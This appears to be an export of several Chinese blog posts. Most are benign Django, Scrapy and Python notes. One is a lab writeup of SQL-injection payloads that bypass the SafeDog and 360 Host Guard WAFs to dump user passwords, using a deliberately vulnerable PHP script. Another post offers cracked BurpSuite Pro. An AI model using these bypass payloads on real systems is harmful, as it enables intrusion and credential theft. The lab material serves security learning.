[{"title":"【Django 学习笔记】2、模型","url":"/year/200229-223431.html","content":"\n# 0x00 模型\n\n* 当前项目的开发, 都是数据驱动的。\n\n* 使用Django进行数据库开发的提示 ：\n  * `MVT`设计模式中的`Model`, 专门负责和数据库交互.对应`(models.py)`\n  * 由于`Model`中内嵌了`ORM框架`, 所以不需要直接面向数据库编程.\n  * 而是定义模型类, 通过`模型类和对象`完成数据库表的`增删改查`.\n  * `ORM框架`就是把数据库表的行与相应的对象建立关联, 互相转换.使得数据库的操作面向对象.\n\n* 使用Django进行数据库开发的步骤 ：\n\n  1. 定义模型类\n  2. 模型迁移\n  3. 操作数据库\n\n<!--more-->\n\n## 1、定义模型类\n\n在这之前需要先设计数据库的表什么的，这里就不详细的说了（主要是我太懒了，手动狗头），感兴趣的可以看本文的参考链接，下面直接贴定义模型类的代码.\n\n\n```Python\n# BookManager/Book/models.py\nfrom django.db import models\n\nclass BookInfo(models.Model):  # 定义数据信息类模型\n\tname = models.CharField(max_length=10)  # 设计name属性\n\t\nclass PeopleInfo(models.Model):  # 定义人物信息类模型\n\tname = models.CharField(max_length=10)\n\tgender = models.BooleanField()\n\tbook = models.ForeignKey(BookInfo)\n```\n\n## 2、模型迁移\n\n由两步完成，首先生成迁移文件，根据模型类生成创建表的语句；接下来执行迁移，根据第一步生成的语句在数据库中创建表。分别由以下两句完成。\n\n```bash\npython3 manage.py makemigrations\npython3 manage.py migrate\n```\n\n运行结果：\n\n```bash\nBookManager/ > python3 manage.py makemigrations\nTraceback (most recent call last):\n  File \"manage.py\", line 21, in <module>\n    main()\n………内容太多，此处省略………\nTypeError: __init__() missing 1 required positional argument: 'on_delete'\n```\n\n在运行第一个命令的时候报错了，此时只需要修改定义外键的那行代码即可。\n\n```python\n# 原来的\nbook = models.ForeignKey(BookInfo)\n#修改后\nbook = models.ForeignKey(BookInfo,on_delete=models.CASCADE)\n```\n\n发生这个错误的原因是由于我看的教程使用的是1.8版本的Django，而我安装的是3.0，Django在2.0版本后，如果定义外键就需要加上`on_delete`选项了，OK，接下来，继续运行这两个代码。\n\n```bash\nBookManager/ > python3 manage.py makemigrations\nMigrations for 'Book':\n  Book\\migrations\\0001_initial.py\n    - Create model BookInfo\n    - Create model PeopleInfo\n\nBookManager/ > python3 manage.py migrate\nOperations to perform:\n  Apply all migrations: Book, admin, auth, contenttypes, sessions\nRunning migrations:\n  Applying Book.0001_initial... OK\n………内容太多，此处省略………\n  Applying sessions.0001_initial... OK\n```\n\n到此，将主目录下生成的`db.sqlite3`文件拖拽到Database窗口中即可，如果没有Database的窗口，可以用Pycharm专业版试试。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/4django_note.png)\n\n# 0x01 站点管理\n\n* 站点分为内容发布和公共访问两部分。\n* 使用django站点管理模块步骤：\n  * 管理界面本地化\n  * 创建管理员\n  * 注册模型类\n  * 自定义站点管理界面\n\n\n\n## 1、管理界面本地化\n\n 将语言，时间设置为本地的语言时间，大陆使用的`简体中文`，时区使用`亚洲/上海`时区，修改`settings.py`文件。\n\n> ps：为什么是上海时区，而不是北京时区？可能老外感觉上海才是国际大都市，北京只是二三线城市，毕竟老外对中国的印象都是陆家嘴而不是天安门（道听途说，不要当真，嘿嘿）\n\n```python\n# BookManager/BookManager/settings.py\nLANGUAGE_CODE = 'zh-Hans'\nTIME_ZONE = 'Asia/Shanghai'\n```\n\n## 2、创建管理员\n\n```bash\npython3 manage.py createsuperuser\n```\n\n 运行命令\n\n```bash\nBookManager/ > python3 manage.py createsuperuser\n用户名 (leave blank to use 'dora'): test\n电子邮件地址: test@test.com\nPassword:\nPassword (again):\nSuperuser created successfully.\n```\n\n运行服务\n\n```\nBookManager/ > python3 manage.py runserver\nWatching for file changes with StatReloader\nPerforming system checks...\nSystem check identified no issues (0 silenced).\nFebruary 29, 2020 - 20:52:43\nDjango version 3.0.3, using settings 'BookManager.settings'\nStarting development server at http://127.0.0.1:8000/\nQuit the server with CTRL-BREAK.\n```\n\n运行之后，在浏览器打开 http://127.0.0.1:8000/admin，使用刚才创建的用户名密码登陆。\n\n## 3、注册模型类\n\n刚打开管理员界面的时候，只能看到`认证和授权`管理栏，这时候就需要将模型类注册进去。\n\n修改`admin.py`代码\n\n```python\n# BookManager/Book/admin.py\nfrom django.contrib import admin\nfrom Book.models import BookInfo,PeopleInfo\nadmin.site.register(BookInfo)\nadmin.site.register(PeopleInfo)\n```\n\n刷新浏览器页面，即可看到刚添加的两个模型类。如果页面无法加载，可以看看是不是服务出现异常，如果出现异常，重新启动服务即可。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/5django_note.png)\n\n## 4、自定义站点管理界面\n\n在管理页面中，随便添加点数据，之后会发现书籍的名称都显示成了`BookInfo object`\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/6django_note.png)\n\n此时，只需要在`model.py`里的class里添加以下内容即可。\n\n```python\ndef __str__(self):\n\treturn self.name\n```\n\n`model.py`完整的代码就是这个样子：\n\n```python\n# BookManager/Book/models.py\nfrom django.db import models\n\nclass BookInfo(models.Model):  # 定义数据信息类模型\n\tname = models.CharField(max_length=10)  # 设计name属性\n\tdef __str__(self):\n\t\treturn self.name\n\nclass PeopleInfo(models.Model):  # 定义人物信息类模型\n\tname = models.CharField(max_length=10)\n\tgender = models.BooleanField()\n\tbook = models.ForeignKey(BookInfo,on_delete=models.CASCADE)\n\tdef __str__(self):\n\t\treturn self.name\n```\n\n此时，再刷新页面，就可以看到显示正常了，同样 people info 界面也是正常的了。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/7_1django_note.png)\n\n但是，这样显示还是不够直观，所以就需要自定义站点管理界面了，接下来修改`admin.py`页面，添加以下语句：\n\n```python\nclass PeopleInfoAdmin(admin.ModelAdmin):\n\tlist_display = ['id', 'name', 'gender', 'book']\n```\n\n`admin.py`完成的代码如下：\n\n```python\n# BookManager/Book/admin.py\nfrom django.contrib import admin\nfrom Book.models import BookInfo, PeopleInfo\n\nclass PeopleInfoAdmin(admin.ModelAdmin):\n\tlist_display = ['id', 'name', 'gender', 'book']\n\nadmin.site.register(BookInfo)\nadmin.site.register(PeopleInfo, PeopleInfoAdmin)#注意此处添加PeopleInfoAdmin以注册\n```\n\n再来刷新一下页面，就舒服很多了。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/8django_note.png)\n\n\n\n> 参考链接：\n>\n> https://youtu.be/BXyGr9JQVcc\n>\n> https://www.cnblogs.com/Demon-Mx/p/8385318.html\n>\n> https://blog.csdn.net/qq_35965090/article/details/81663941\n>\n> 更多信息欢迎关注我的微信公众号：TeamsSix\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","Django","学习笔记"],"categories":["学习笔记"]},{"title":"【Django 学习笔记】1、基础概念和MVT架构","url":"/year/200229-220746.html","content":"\n# 0x00 Django 简介\n\n* Django是Python写的开源Web开发框架，主要目的是做一个简便、快速的开发数据库驱动的网站\n* Django遵循MVC设计模式，在Django中有个专有名词，叫做MVT\n  * 设计模式就是前辈们在开发过程中总结出来的经验和套路\n  * MVC是一种设计模式，在这种设计模式下衍生出了MVT\n* Django中文说明文档：[https://yiyibooks.cn/xx/django_182/index.html](https://yiyibooks.cn/xx/django_182/index.html)\n\n<!--more-->\n\n# 0x01 MVC 简介\n\n* 全拼：`Model View Controller`\n* MVC 核心思想：**解耦**\n  - 让不同的模块之间降低耦合, 增强代码的可扩展性和可移植性, 实现更好的向后续版本的兼容\n  - 开发原则 : **高内聚, 低耦合**\n* MVC 解析\n  - `M`全拼为`Model`, 主要封装对数据库层的访问, 内嵌ORM框架, 实现面向对象的编程来操作数据库.\n\n  - `V`全拼为`View`, 用于封装结果, 内嵌了模板引擎, 实现动态展示数据.\n\n  - `C`全拼为`Controller`, 用于接收GET或POST请求, 处理业务逻辑, 与Model和View交互, 返回结果.\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/1django_note.png)\n\n# 0x02 MVT 简介\n\n* MVT全拼为`Model-View-Template`\n* MVT核心思想： **解耦**（按照模块间的职能进行划分，然后做解耦）\n* MVT解析\n  - `M (模型)`全拼为`Model`, 与MVC中的M功能相同, 负责数据处理, 内嵌了ORM框架.\n  - `V (视图)`全拼为`View`, 与MVC中的C功能相同, 接收HttpRequest, 业务处理，返回HttpResponse.\n  - `T (模板)`全拼为`Template`, 与MVC中的V功能相同, 负责封装构造要返回的html, 内嵌了模板引擎.\n* MVT 和 MVC 差异就在于黑箭头标识出来的部分.\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/2django_note.png)\n\n**学习 Django, 重点就是研究 `Model-View-Template` 三个模块间如何协同工作及各自模块的代码如何编写。**\n\n# 0x03 Django安装及项目创建\n\n## 1、安装Django\n\n```\npip install django\n```\n\n## 2、创建Django项目\n\n以书籍管理系统为例，这里创建的项目名为\"book\"\n\n```bash\n> django-admin startproject BookManager #创建项目\n> cd BookManager\nBookManager/ > python3 manage.py startapp Book #创建应用\nBookManager/ > tree\n.\n├── Book\n│   ├── __init__.py\t#表示文件Book可以被当作包使用\n│   ├── admin.py\t#后台的站点管理注册文件\n│   ├── apps.py\n│   ├── migrations\t#做模型迁移\n│   │   └── __init__.py\n│   ├── models.py\t#MVT中的M\n│   ├── tests.py\t#做测试用\n│   └── views.py\t#MVT中的V\n├── BookManager\n│   ├── __init__.py\t#表示文件BookManager可以被当作包使用\n│   ├── __pycache__\n│   │   ├── __init__.cpython-37.pyc\n│   │   └── settings.cpython-37.pyc\n│   ├── asgi.py\n│   ├── settings.py\t#项目的整体配置文件\n│   ├── urls.py\t\t#项目的URL配置文件\n│   └── wsgi.py\t\t#项目与WSGI兼容的Web服务器入口\n└── manage.py\t\t#项目运行的入口, 指定配置文件路径\n\n4 directories, 15 files\n```\n\n创建之后，使用PyChram打开，在`setting.py`的第39行下方添加`'Book',`即将INSTALLED_APPS修改成如下所示：\n\n```python\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'Book',\t#添加此行以安装应用\n]\n```\n\n## 3、运行项目\n\n在项目目录下，执行`python3 manage.py runserver`即可运行\n\n```\npython3 manage.py runserver\n```\n\n运行结果：\n\n```bash\nBookManager/ > python3 manage.py runserver\nWatching for file changes with StatReloader\nPerforming system checks...\nSystem check identified no issues (0 silenced).\nYou have 17 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions.\nRun 'python manage.py migrate' to apply them.\nFebruary 28, 2020 - 19:08:25\nDjango version 3.0.3, using settings 'BookManager.settings'\nStarting development server at http://127.0.0.1:8000/\nQuit the server with CTRL-BREAK.\n```\n\n此时，浏览器访问`http://127.0.0.1:8000/`，出现以下界面，说明项目已经成功创建了。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/3django_note.png)\n\n\n\n> 参考链接：\n>\n> [https://youtu.be/BXyGr9JQVcc](https://youtu.be/BXyGr9JQVcc)\n>\n> [https://www.cnblogs.com/Demon-Mx/p/8385318.html](https://www.cnblogs.com/Demon-Mx/p/8385318.html)\n>\n> 更多信息欢迎关注我的微信公众号：TeamsSix\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","Django","学习笔记"],"categories":["学习笔记"]},{"title":"【工具分享】分享一个jQuery多版本XSS漏洞检测工具","url":"/year/200223-231648.html","content":"\n# 0x00 前言\n\n最近在搞一个 jQuery v2.1.4 DOM-XSS 漏洞的复现，在网上找了很多Payload都不能用，大多数Payload都只适用于 jQuery v1.x 版本的。\n\n后来看到有个文章说需要Safari浏览器，于是又废了半天劲装了个黑苹果（当时不知道原来Safari浏览器还有Windows版），用Safari浏览器一番折腾依旧没有复现，直到后来在GitHub上找到了这个检测工具，分享出来，避免踩坑。\n\n<!--more-->\n\n# 0x01 工具使用\n\n> 下载地址：[https://github.com/mahp/jQuery-with-XSS](https://github.com/mahp/jQuery-with-XSS)\n\n\n1、下载之后，解压，使用编辑器打开，修改第9行代码，将代码中 src 后的链接修改为自己要验证的js地址链接。\n\n```\n<script type=\"text/javascript\" src=\"http://yourjquerylink/jquery.min.js\"></script>\n```\n\n2、保存之后，使用浏览器打开，然后可以看到3个Demo.\n\n```\nbug-9521\nbug-11290\nbug-11974\n```\n\n3、可以依次点击这三个Demo，看看哪个会弹窗，我这里是 jQuery v2.1.4 的版本，在点击 bug-11974 发生了弹窗，说明此版本的漏洞被验证成功了。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/1Snipaste_2020-02-23_23-05-36.png)\n\n4、也可以点击页面中的 test version，来判断自己版本的  jQuery 版本存在的 bug 编号，例如我这里的  jQuery v2.1.4 版本就对应着 bug-2432和bug-11974。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/2Snipaste_2020-02-23_23-09-03.png)\n\n5、知道 bug 编号之后，再来到 test.html 页面点击对应的 bug编号即可。\n\n# 0x02 小结\n\n以上工具的使用方法是自己慢慢摸索出来的，如有不对的地方欢迎留言批评指正。\n\n> 更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["工具分享","jQuery","XSS"],"categories":["工具分享"]},{"title":"【经验总结】解决 BurpSuite Pro v2020.1 版本中文乱码问题","url":"/year/200217-134445.html","content":"\n# 0x00 前言\n\n之前在我的公众号分享了 BurpSuite Pro v2020.1 版本，但是在使用过程中发现总是会有中文乱码的情况出现，后来使用 Lucida 字体，乱码的情况得到了缓解，但是有些网页依旧会出现乱码的情况，直到后来才意识到问题其实不在于字体的选择。\n\n<!--more-->\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/1Snipaste_2020-02-17_13-34-32.png)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/2Snipaste_2020-02-17_13-37-02.png)\n\n# 0x01 解决办法\n\n来到 User Options --> Display --> Character Sets，在第四个选项中选择 UTF-8，中文乱码的问题就可以得到解决，这个时候不管我字体选择的是哪一个，中文都是显示正常的。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/3Snipaste_2020-02-17_13-38-35.png)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/4Snipaste_2020-02-17_13-39-09.png)\n\n# 0x02 总结\n\n在网上找了很多解决办法，但是大部分文章都是说更改中文字体就能解决，但是我这个版本没有中文字体，所以那些文章里的办法都不能用，最后才意识到通过修改编码就能解决。\n\n> 更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["BurpSuite","软件","经验总结"],"categories":["经验总结"]},{"title":"【工具分享】BurpSuite Pro v2020.1 无后门专业破解版","url":"/year/200211-135752.html","content":"\n# 前言\n\n工欲善其身，必先利其器，吃饭的家伙终于更新了，这次改动还蛮大的，尤其是加入了黑暗模式。\n\n至于工具的使用及破解方法相信你既然能看到这篇文章，那就不用我过多赘述了 [手动狗头]。\n\n<!--more-->\n\n# 新功能\n\n1、HTTP消息编辑器下JavaScript、JSON、CSS的语法高亮颜色\n\n2、添加了行号，代码折叠功能\n\n3、漏洞扫描检测、规则有巨大提升\n\n4、增加黑暗主题\n\n5、新增特殊功能、性能改进...\n\n# 获取方式\n\n在我的公众号（TeamsSix）回复 \" Burp \" 即可获取下载地址。\n\n# 新版效果\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/burp20201_1.png)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/burp20201_3.png)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/burp20201_2.png)\n\n> 更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)\n","tags":["BurpSuite","工具分享","软件"],"categories":["工具分享"]},{"title":"【摘要】漏洞组合拳之XSS+CSRF记录","url":"/year/200206-202959.html","content":"\n前几天，我在FreeBuf发布了一篇文章《漏洞组合拳之XSS+CSRF记录》，因为版权原因，无法在​这里发布。\n\n文章里介绍了两种常见的组合拳方法，感兴趣的可以点击下方链接进行查看。\n\n文章链接：[https://www.freebuf.com/vuls/225096.html](https://www.freebuf.com/vuls/225096.html)\n\n<!--more-->\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n>本文原文地址：[https://www.teamssix.com/year/200206-202959.html](https://www.teamssix.com/year/200206-202959.html)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["XSS","CSRF","组合拳"],"categories":["摘要"]},{"title":"【经验总结】Python3 Requests 模块请求内容包含中文报错的解决办法","url":"/year/200206-202951.html","content":"\n# 0x00 前言\n\n最近在写一个爬虫代码，里面需要使用 get 传参中文，但是如果直接使用中文而不对其编码的话，程序将会报错。\n\n```\nUnicodeEncodeError: 'latin-1' codec can't encode characters in position 38-39: ordinal not in range(256)\n```\n\n<!--more-->\n\n# 0x01 网上的一些解决办法\n\n参考网上的解决办法，比如下面的几种办法。\n\n```\n1、在中文后加上\".encode('GBK')\"\n2、在文件头部加上\"＃coding = utf-8\"\n3、在中文后加上\".encode('utf-8')\"\n```\n\n这几种方法在我这里都行不通，抓包也可以看到数据包里的中文并不是我们想象的经过 URL 编码的字符。\n\n```\nGET /test=b'%5Cxe6%5Cxb5%5Cx8b%5Cxe8%5Cxaf%5Cx95' HTTP/1.1\n```\n\n# 0x02 可行的办法\n\n最后才意识到，其实并不需要对中文进行 GBK、UTF-8 转码，而应该对其进行 URL 编码。\n\n```\nfrom urllib.parse import quote\ntext = quote(\"测试\", 'utf-8')\n```\n\n利用 quote 函数对 \"测试\" 进行 URL 编码后，再次抓包可以看到中文部分已经是 URL 格式了。\n\n```\nGET /test=%E6%B5%8B%E8%AF%95 HTTP/1.1\n```\n\n此时，程序也不再报错，可以顺利执行了。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n>本文原文地址：[https://www.teamssix.com/year/200206-202951.html](https://www.teamssix.com/year/200206-202951.html)\n>参考文章：[https://blog.csdn.net/qq_33876553/article/details/79730246](https://blog.csdn.net/qq_33876553/article/details/79730246)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)\n\n","tags":["经验总结","Python3","解决办法"],"categories":["经验总结"]},{"title":"【经验总结】SQL注入Bypass安全狗360主机卫士","url":"/year/200105-211642.html","content":"# 0x00 前言\n这类的文章已经是比较多了，本文也主要是作为学习笔记来记录，主要是记录一下我在学习 SQL 注入 Bypass 的过程，同时前人的不少绕过方法已经失效了，所以这里也是记录一下最新规则的一些绕过方法。\n\n# 0x01 环境搭建\n测试环境：Win7 + Apache + MySQL 5.7.26 + PHP 5.5.45\n<!--more-->\n测试代码：\n\n``` php\n<?php\nif ($_GET['id']==null){$id=$_POST['id'];}\nelse {$id=$_GET['id'];}\n$con = mysql_connect(\"localhost\",\"root\",\"root\");\nif (!$con){die('Could not connect: ' . mysql_error());}\nmysql_select_db(\"dvwa\", $con);\n$query = \"SELECT first_name,last_name FROM users WHERE user_id = '$id'; \";\n$result = mysql_query($query)or die('<pre>'.mysql_error().'</pre>');\nwhile($row = mysql_fetch_array($result))\n{\n echo $row['0'] . \"&nbsp\" . $row['1'];\n echo \"<br />\";\n}\necho \"<br/>\";\necho $query;\nmysql_close($con);\n?>\n```\n上面的测试代码是参考安全客上的一篇文章，不过为了方便测试在原代码的基础上加入了 POST 传参功能，代码来自本文参考文章第 2 篇。\n\n为方便接下来的测试，需要本地先安装 dvwa ，至于代码中其他的参数，比如数据库地址、用户名、密码什么的自行根据自己本地配置情况修改即可。\n\n如果这个代码在使用的过程中，只使用 POST 方法传参的话，页面是会输出错误信息的，如果不想让它输出错误信息，可以在 php.ini 文件中修改 display_errors 为 Off ，然后重启 Apache 即可。\n\n访问本地搭建的靶场地址，像下面这个样子就算是搭建成功了，其中 192.168.38.132​ 需要修改为你自己的靶机 IP 地址。\n\n```\nhttp://192.168.38.132/sql.php?id=1\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass1.png)\n\n# 0x02 安全狗\n## 1、搭建\n下载地址：[http://free.safedog.cn/website_safedog.html](http://free.safedog.cn/website_safedog.html)\n\n我下载的是 Windows Apache V4.0 的版本，2019-11-27 更新的规则。\n\n在安装安全狗的时候，如果不知道服务名填什么，可以查看本文参考文章第 5 篇。\n\n如果使用 phpstudy 8.0 及更高版本可能在系统服务中找不到 apache 的服务名，所以这时建议使用 8.0 以下版本，比如 phpstudy 2018，之后再设置运行模式为“系统服务”即可，不要问我怎么知道的 [狗头]\n\n搭建好后，我们构造 SQL 注入语句判断注入点，访问目标网站，网站有安全狗的提示，说明就搭建好了。\n\n```\nhttp://192.168.38.132/sql.php?id=1' and '1'='1\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass2.png)\n\n## 2、找寻绕过方法\n```\n' and '1'='1\n```\n多次测试发现单引号不会被拦截，and 也不会被拦截，只有当 and 后加上字符，比如 and '1' 的时候才会被拦截，所以接下来就主要针对 and 进行绕过测试。\n\n一般情况下，如果 and 被拦截，可以下列字符进行绕过。\n\n```\n+，-，*，%，/，<<，>>，||，|，&，&&\n```\n或者使用 or 进行绕过，也可以直接使用异或进行绕过。\n\n```\n^，xor\n```\n因为我下载的版本的规则是最新的，所以参考文章中利用 && 替换 and 的方法已经失效了，经过多次测试，这里使用异或是可以绕过安全狗进而判断注入点的。\n\n```\n' xor '1\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass3.png)\n\n接下来使用 union select 查看一下数据库名和用户名。\n\n```\n'union select database(),user()'\n```\n直接这样肯定会被拦截的，所以接下来找寻绕过方法。\n\n### a、利用()代替空格\n```\n'union select(database()),(user())'\n```\n数据或者函数周围可以无限嵌套()。\n\n### b、利用 mysql 特性 /*!*/ 执行语句\n```\n'union /*!50010select*/(database()),(user())'\n```\n/*!*/ 中间的代码是可以执行的，其中 50010 为 mysql 版本号，只要 mysql 大于这个版本就会执行里面的代码。\n\n### c、利用/**/混淆代码\n```\n'union/**//*!50010select*/(database/**/()),(user/**/())'\n```\nmysql 关键字中是不能插入 /\\*\\*/ 的，即 se/\\*\\*/lect 是会报错的，但是函数名和括号之间是可以加上 /\\*\\*/ 的,像 database/\\*\\*/() 这样的代码是可以执行的。\n\n事实上，由于我的防护规则是 2019-11-27 更新的，所以即使如此，依旧不能绕过，不过由于安全狗对于 GET 的过滤相较于 POST 更为严格，所以后来经过测试发现使用 POST 方法是可以进行绕过的。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass4.png)\n\n可以看到使用 POST 方法是可以成功绕过，除了上面的3个方法，有时候使用 %00 也会有意想不到的效果。\n\n知道了绕过方法，便可以一路找到用户名和密码。\n\n```\n'union select user,password from users#\n```\n经过测试，发现在 POST 方法下，加个括号即可绕过安全狗，这也足以看出安全狗对于 POST 方法的过滤是多么不严格。\n\n```\n'union select user,password from (users)#\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass5.png)\n\n绕过的方法还有很多，安全狗的就记录到这里，接下来看看 360 主机卫士。\n\n# 0x03 360 主机卫士\n## 1、搭建\n曾经 360 出现过一款 360 主机卫士，不过现在已经停止更新和维护了，官网也打不开了，所以只能在第三方网站下载了，这里我下载的是 2.0.5.9 版本。\n\n下载地址：[http://www.pc6.com/softview/SoftView_145230.html](http://www.pc6.com/softview/SoftView_145230.html)\n\n虽然 360 主机卫士已经停止了更新，但是拿来练练手还是可以滴。\n\n下载之后，访问 ' and '1'='1 如果发现被拦截了，返回内容像下面这个样子，说明就搭建成功了。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass6.png)\n\n## 2、找寻绕过方法\n```\n' and '1'='1\n```\n经过多次测试，这里使用 && 即可绕过，使用异或也是可以绕过的。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass7.png)\n\n接下来看看 union select 怎么进行绕过。\n\n```\n'union select database(),user()'\n```\n经过多次测试，发现可以通过缓冲区溢出进行绕过，但也只有在 POST 方法下才有效。\n\n```\n' and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)union select database(),user()'\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass8.png)\n\n# 0x04 工具\n提到 SQL 注入的工具，个人觉着就不得不提 shack2 的超级 SQL 注入工具，针对于上面缓冲区绕过的情况，使用这个工具可以很方便的进行 SQL 注入。\n\n工具下载地址：[https://github.com/shack2/SuperSQLInjectionV1/releases](https://github.com/shack2/SuperSQLInjectionV1/releases)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass9.png)\n\n把 Burp 中的数据包复制到工具中，在注入标记、编码标记后，就可以获取数据了，对于如何标记注入点不理解的可以看看这个工具的教学视频以及文档，会容易理解些。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass10.png)\n\n至于其他更为复杂的绕过，比如上面安全狗的绕过，利用这个工具的注入绕过模块也是可以的，当然使用 sqlmap 的 tamper 脚本也是 OK 的，暂时本文就先记录到这里。\n\n>更多信息欢迎关注我的微信公众号：TeamsSix\n\n>参考文章：\n>[https://zhuanlan.zhihu.com/p/41332480](https://zhuanlan.zhihu.com/p/41332480)\n>[https://www.anquanke.com/post/id/102852](https://www.anquanke.com/post/id/102852)\n>[https://www.secpulse.com/archives/68991.html](https://www.secpulse.com/archives/68991.html)\n>[https://www.cnblogs.com/xiaozi/p/9132737.html](https://www.cnblogs.com/xiaozi/p/9132737.html)\n>[https://blog.csdn.net/weixin_30886233/article/details/95871508](https://blog.csdn.net/weixin_30886233/article/details/95871508)\n","tags":["经验总结","SQL 注入","Bypass"],"categories":["经验总结"]},{"title":"【Python Scrapy 爬虫框架】 6、继续爬虫、终止和重启任务","url":"/year/191226-151707.html","content":"# 0x00 前言\n有时候我们不想只爬一个页面的，比如之前我只爬了主页，但是现在想把其他页面的也爬下来，这就是本文的任务。\n\n# 0x01 修改代码\n在之前的基础上，修改 teamssix_blog_spider.py 文件，首先添加 start_urls\n\n```python\nstart_urls = [\n   'https://www.teamssix.com',\n   'https://www.teamssix.com/page/2/',\n   'https://www.teamssix.com/page/3/',\n   'https://www.teamssix.com/page/4/',\n   'https://www.teamssix.com/page/5/'\n]\n```\n<!--more-->\n接下来在 sub_article 函数尾部添加 parse 函数的全部代码\n\n```python\nsoup = BeautifulSoup(response.text, 'html.parser')\nfor i in soup.select('.post-title'):\n   url = 'https://www.teamssix.com{}'.format(i['href'])\n   yield scrapy.Request(url, callback=self.sub_article)\n```\n所以 sub_article 函数的完整代码就是这个样子：\n\n```python\ndef sub_article(self,response):\n   soup = BeautifulSoup(response.text,'html.parser')\n   title = self.article_title(soup)\n   list = self.article_list(soup)\n   print(title)\n   item = TeamssixItem(_id = response.url,title = title,list = list)\n   yield item\n\n   soup = BeautifulSoup(response.text, 'html.parser')\n   for i in soup.select('.post-title'):\n      url = 'https://www.teamssix.com{}'.format(i['href'])\n      yield scrapy.Request(url, callback=self.sub_article)\n```\n从最后一行 callback=self.sub_article 这里不难看出这里其实就是一个循环， sub_article 函数第一遍执行完，又会调用继续执行第二遍，直到 start_urls 被执行完。\n\n# 0x02 运行\n代码修改的就这些，接下来直接 scrapy crawl blogurl 运行代码，来到 robo 3T 看看爬取到的数据。\n\n![图片](https://uploader.shimo.im/f/4C5P0BNBAy8DfwVP.png!thumbnail)\n\n最终在这些 start_urls 中爬取下来了 43 篇文章，Emm，还行。\n\n这次的 Scrapy 学习笔记就更新到这里，这个项目的代码已经放在了我的 GitHub 里，项目链接已经放在了下面。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n>项目地址：[https://github.com/teamssix/scrapy_study_notes](https://github.com/teamssix/scrapy_study_notes)\n\n>参考链接：\n>[https://youtu.be/aDwAmj3VWH4](https://youtu.be/aDwAmj3VWH4)\n>[http://doc.scrapy.org/en/latest/topics/architecture.html](http://doc.scrapy.org/en/latest/topics/architecture.html)\n","tags":["Python","学习笔记","Scrapy"],"categories":["Python Scrapy 爬虫框架学习笔记"]},{"title":"【Python Scrapy 爬虫框架】 5、利用 pipelines 和 settings 将爬取数据存储到 MongoDB","url":"/year/191226-151702.html","content":"# 0x00 前言\n前文中讲到了将爬取的数据导出到文件中，接下来就在前文的代码基础之上，将数据导出到 MongoDB中。\n\n# 0x01 配置 pipelines.py\n首先来到 pipelines.py 